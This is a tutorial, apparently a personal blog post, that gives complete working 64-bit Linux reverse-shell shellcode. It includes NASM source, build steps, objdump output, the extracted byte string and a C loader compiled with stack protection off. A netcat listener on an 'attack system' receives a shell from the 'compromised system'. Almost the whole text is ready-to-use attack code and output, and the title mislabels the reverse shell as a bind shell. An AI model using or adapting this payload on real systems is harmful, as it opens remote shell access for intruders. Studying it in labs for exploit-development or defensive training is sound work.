## Reverse TCP Bind Shell 64 bit

In learning 64 bit assembly language under Linux, I thought I would convert some of the 32 bit code I have already in my repo. Therefore there won’t be a full explanation, just the basics.

The assembly language code.
```nasm
global _start
section .text
 
_start:
    xor rax,rax
    xor rdi,rdi
    xor rsi,rsi
    xor rdx,rdx
    xor r8,r8
     
    ; Socket
    ; Function prototype:
    ;   int socket(int domain, int type, int protocol)
    ; Purpose:
    ;   creates an endpoint for communications, returns a
    ;   descriptor that will be used throughout the code to
    ;   bind/listen/accept communications
    push 0x2
    pop rdi
    push 0x1
    pop rsi
    push 0x6
    pop rdx
    push 0x29
    pop rax
    syscall 
    mov r8,rax
     
    ; Connect
    ; Function protoype:
    ;   int connect(int sockfd, const struct sockaddr *addr,
    ;       socklen_t addrlen)
    ; Purpose:
    ;   initiate a connection on socket referred by the file
    ;   descriptor to the address specified in addr.
    xor rsi,rsi
    xor r10,r10
    push r10
    mov byte [rsp],0x2
    mov word [rsp+0x2],0x697a
    mov dword [rsp+0x4],0xa1080c0
    mov rsi, rsp
    push byte 0x10
    pop rdx
    push r8
    pop rdi
    push 0x2a
    pop rax
    syscall
     
    ; Dup2
    ; Function prototype:
    ;   int dup2(int oldfd, int newfd)
    ; Purpose:
    ;   duplicate a file descriptor, copies the old file
    ;   descriptor to a new one allowing them to be used
    ;   interchangably, this allows all shell ops to/from the
    ;   compromised system
    xor rsi,rsi
    push 0x3
    pop rsi
doop:
    dec rsi
    push 0x21
    pop rax
    syscall 
    jne doop
     
    ; Execve
    ; Function descriptor:
    ;   int execve(const char *fn, char *const argv[],
    ;       char *const envp[])
    ; Purpose:
    ;   to execute a program on a remote and/or compromised
    ;   system. There is no return from using execve therefore
    ;   an exit syscall is not required
    xor rdi,rdi
    push rdi
    push rdi
    pop rsi
    pop rdx
    mov rdi,0x68732f6e69622f2f
    shr rdi,0x8
    push rdi
    push rsp
    pop rdi
    push 0x3b
    pop rax
    syscall
```
Build the code:
```
$ nasm -felf64 -o reversetcpbindshell.o reversetcpbindshell.asm
$ ld -o reversetcpbindshell reversetcpbindshell.o
```
Check for nulls:
```
$ objdump -D reversetcpbindshell -M intel
	
reversetcpbindshell:     file format elf64-x86-64
Disassembly of section .text:
 
0000000000400080 <_start>:
  400080:   48 31 c0                xor    rax,rax
  400083:   48 31 ff                xor    rdi,rdi
  400086:   48 31 f6                xor    rsi,rsi
  400089:   48 31 d2                xor    rdx,rdx
  40008c:   4d 31 c0                xor    r8,r8
  40008f:   6a 02                   push   0x2
  400091:   5f                      pop    rdi
  400092:   6a 01                   push   0x1
  400094:   5e                      pop    rsi
  400095:   6a 06                   push   0x6
  400097:   5a                      pop    rdx
  400098:   6a 29                   push   0x29
  40009a:   58                      pop    rax
  40009b:   0f 05                   syscall 
  40009d:   49 89 c0                mov    r8,rax
  4000a0:   48 31 f6                xor    rsi,rsi
  4000a3:   4d 31 d2                xor    r10,r10
  4000a6:   41 52                   push   r10
  4000a8:   c6 04 24 02             mov    BYTE PTR [rsp],0x2
  4000ac:   66 c7 44 24 02 7a 69    mov    WORD PTR [rsp+0x2],0x697a
  4000b3:   c7 44 24 04 c0 80 10    mov    DWORD PTR [rsp+0x4],0xa1080c0
  4000ba:   0a 
  4000bb:   48 89 e6                mov    rsi,rsp
  4000be:   6a 10                   push   0x10
  4000c0:   5a                      pop    rdx
  4000c1:   41 50                   push   r8
  4000c3:   5f                      pop    rdi
  4000c4:   6a 2a                   push   0x2a
  4000c6:   58                      pop    rax
  4000c7:   0f 05                   syscall 
  4000c9:   48 31 f6                xor    rsi,rsi
  4000cc:   6a 03                   push   0x3
  4000ce:   5e                      pop    rsi
00000000004000cf <doop>:
  4000cf:   48 ff ce                dec    rsi
  4000d2:   6a 21                   push   0x21
  4000d4:   58                      pop    rax
  4000d5:   0f 05                   syscall 
  4000d7:   75 f6                   jne    4000cf <doop>
  4000d9:   48 31 ff                xor    rdi,rdi
  4000dc:   57                      push   rdi
  4000dd:   57                      push   rdi
  4000de:   5e                      pop    rsi
  4000df:   5a                      pop    rdx
  4000e0:   48 bf 2f 2f 62 69 6e    movabs rdi,0x68732f6e69622f2f
  4000e7:   2f 73 68 
  4000ea:   48 c1 ef 08             shr    rdi,0x8
  4000ee:   57                      push   rdi
  4000ef:   54                      push   rsp
  4000f0:   5f                      pop    rdi
  4000f1:   6a 3b                   push   0x3b
  4000f3:   58                      pop    rax
  4000f4:   0f 05                   syscall 
```
Test above executable using two systems (virtual or otherwise):
Open a terminal on the attack system,
```
$ nc -l -v 31337
```
the attack system will await a connection from the compromised system.

Open a terminal on the system to be compromised,
```
$ ./reversetcpbindshell
```
on the attack system a connection message should now appear, shell access is now available on the compromised system. Try typing in some commands to prove this is the case.

Get shellcode from executable:
Use the following from the commandlinefu website replacing PROGRAM with the name of the required executable like so,
```bash
$ objdump -d ./reversetcpbindshell | grep ‘[0-9a-f]:’ | grep -v ‘file’ | cut -f2 -d: | cut -f1-7 -d’ ‘ | tr -s ‘ ‘ | tr ‘t’ ‘ ‘ | sed ‘s/ $//g’ | sed ‘s/ /x/g’ | paste -d ” -s | sed ‘s/^/”/’ | sed ‘s/$/”/g’

“\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\xc0\x80\x10\x0a\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05”
```
The shellcode can be copied and pasted into a test program, similar to the one below. The #define IPADDR and PORT is to allow for the simple configuration of IP Address and Port.
```c	
#include <stdio.h>
  
/*
 ipaddr 192.168.1.10 (c0a8010a)
 port 31337 (7a69)
*/
#define IPADDR "\xc0\x80\x10\x0a"
#define PORT "\x7a\x69"
  
unsigned char code[] = 
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
"\x02\"PORT"\xc7\x44\x24\x04"IPADDR"\x48\x89\xe6\x6a\x10"
"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
"\x5f\x6a\x3b\x58\x0f\x05";
 
int
main(void)
{
    printf("Shellcode Length: %dn", (int)sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
    return 0;
}
```
Build the code:
```
$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
```
The options for gcc are to disable stack protection and enable stack execution respectively. Without these options the code will cause a segfault.

Test above executable using two systems (virtual or otherwise):
Open a terminal on the attack system,
```
$ nc -l -v 31337
```
the attack system will await a connection from the compromised system.

Open a terminal on the system to be compromised,
```
$ ./reversetcpbindshell
```
on the attack system a connection message should now appear, shell access is now available on the compromised system. Try typing in some commands to prove this is the case.

The shellcode above currently weighs in at 118 bytes. With further research the codebase could be reduced, but that was not the goal of this exercise.


Shell-storm database entry -- http://shell-storm.org/shellcode/files/shellcode-857.php
